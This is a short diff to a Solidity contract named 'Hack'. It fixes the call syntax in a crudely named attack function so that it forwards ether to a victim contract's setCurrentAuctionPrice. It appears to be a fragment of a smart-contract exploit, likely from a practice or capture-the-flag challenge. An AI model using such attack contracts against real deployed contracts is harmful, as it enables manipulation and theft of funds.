@@ -10,6 +10,6 @@ contract Hack {
     }
 
     function attackThisWeakAssContract() public payable {
-        victim.setCurrentAuctionPrice{value: msg.value};
+        victim.setCurrentAuctionPrice{value: msg.value}();
     }
 }
